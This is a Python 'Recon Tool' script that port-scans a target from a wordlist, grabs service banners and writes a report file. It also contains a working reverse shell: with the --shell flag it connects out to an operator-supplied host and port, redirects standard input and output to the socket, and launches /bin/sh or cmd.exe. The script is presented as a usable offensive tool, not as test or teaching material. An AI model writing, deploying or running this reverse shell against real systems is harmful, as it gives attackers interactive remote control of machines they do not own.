import socket
import os
import subprocess
import argparse
import sys
from datetime import datetime


def read_port_list(filename):
    ports = []

    try:
        f = open(filename, "r")

        for line in f:
            line = line.strip()

            if line.isdigit():
                ports.append(int(line))

        f.close()

    except FileNotFoundError:
        print("file not found")
        sys.exit()

    if len(ports) == 0:
        print("wordlist is empty")
        sys.exit()

    return ports


def scan_ports(target, ports):
    open_ports = []

    print("\nPort Scan")
    print("Target:", target)

    report = open("discovery_report.txt", "w")

    report.write("Port Scan Report\n")
    report.write("Target: " + target + "\n")
    report.write("Time: " + str(datetime.now()) + "\n\n")

    for port in ports:

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)

        result = s.connect_ex((target, port))

        if result == 0:
            print(f"Port {port} OPEN")
            open_ports.append(port)
            report.write(f"Port {port} OPEN\n")

        else:
            print(f"Port {port} CLOSED")
            report.write(f"Port {port} CLOSED\n")

        s.close()

    report.write("\nOpen Ports: " + str(open_ports))
    report.close()

    return open_ports


def grab_banner(target, port):

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)

        s.connect((target, port))

        if port == 80 or port == 8080 or port == 8000:
            s.send(b"GET / HTTP/1.0\r\n\r\n")

        banner = s.recv(1024).decode(errors="ignore")

        s.close()

        return banner.strip()

    except:
        return "No Banner"


def get_banners(target, open_ports):

    if len(open_ports) == 0:
        return

    print("\nBanner Grabbing")

    report = open("discovery_report.txt", "a")

    report.write("\n\nBanner Grabbing\n")

    for port in open_ports:

        banner = grab_banner(target, port)

        print(f"Port {port}: {banner[:60]}")

        report.write(f"Port {port}: {banner}\n")

    report.close()


def reverse_shell(lhost, lport):

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((lhost, lport))

    except:
        print("connection failed")
        sys.exit()

    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)

    if os.name == "nt":
        subprocess.call(["cmd.exe"])
    else:
        subprocess.call(["/bin/sh", "-i"])


def get_args():

    parser = argparse.ArgumentParser(description="Recon Tool")

    parser.add_argument("-t", "--target", required=True)
    parser.add_argument("-w", "--wordlist", required=True)

    parser.add_argument(
        "--shell",
        action="store_true"
    )

    parser.add_argument("--lhost")
    parser.add_argument("--lport", type=int)

    args = parser.parse_args()

    if args.shell:

        if not args.lhost or not args.lport:
            print("lhost and lport are required")
            sys.exit()

    return args


def main():

    args = get_args()

    print("Recon Tool")
    print("-" * 20)

    ports = read_port_list(args.wordlist)

    open_ports = scan_ports(args.target, ports)

    get_banners(args.target, open_ports)

    if args.shell:
        reverse_shell(args.lhost, args.lport)


if __name__ == "__main__":
    main()
